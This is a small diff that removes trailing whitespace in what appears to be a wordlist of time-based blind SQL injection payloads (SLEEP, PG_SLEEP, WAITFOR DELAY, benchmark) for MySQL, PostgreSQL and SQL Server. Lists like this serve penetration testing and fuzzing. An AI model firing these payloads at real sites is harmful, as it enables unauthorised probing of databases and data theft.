@@ -52,7 +52,7 @@ Be7BtCuD'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--
 orwa'"
 1;SELECT IF((8303>8302),SLEEP(13),2356)#
 orwa%27;%20waitfor%20delay%20%270:0:5%27%20--%20
-orwa%27);%20waitfor%20delay%20%270:0:6%27%20--%20 
+orwa%27);%20waitfor%20delay%20%270:0:6%27%20--%20
 1%20waitfor%20delay%20'0:0:15'%20--%20
 1%00%C0%A7%C0%A2%252527%252522
 0'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z
@@ -77,7 +77,7 @@ orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
 benchmark(10000000,MD5(1))#
 1' OR NOT 2470=2470-- Ontu
 ' WAITFOR DELAY '0:0:5'--
-';WAITFOR DELAY '0:0:5'-- 
+';WAITFOR DELAY '0:0:5'--
 ')) or sleep(5)='
 ;waitfor delay '0:0:5'--
 );waitfor delay '0:0:5'--
